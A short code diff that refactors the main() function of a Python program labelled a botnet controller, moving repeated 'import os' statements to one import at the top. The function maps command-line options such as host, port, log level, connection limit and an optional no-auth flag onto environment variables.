@@ -491,31 +491,27 @@ Environment Variables:
 
 async def main():
     """Main entry point for the botnet controller."""
+    import os
+    
     args = parse_arguments()
     
     # Override environment variables with command-line arguments
     if args.host:
-        import os
         os.environ['BOTNET_HOST'] = args.host
     
     if args.port:
-        import os
         os.environ['BOTNET_PORT'] = str(args.port)
     
     if args.verbose:
-        import os
         os.environ['BOTNET_LOG_LEVEL'] = 'DEBUG'
     elif args.quiet:
-        import os
         os.environ['BOTNET_LOG_LEVEL'] = 'WARNING'
     
     if args.max_connections:
-        import os
         os.environ['BOTNET_MAX_CONNECTIONS'] = str(args.max_connections)
     
     # Skip authentication if requested
     if args.no_auth:
-        import os
         os.environ['BOTNET_ADMIN_PASSWORD'] = ''
     
     controller = BotnetController(config_file=args.config)
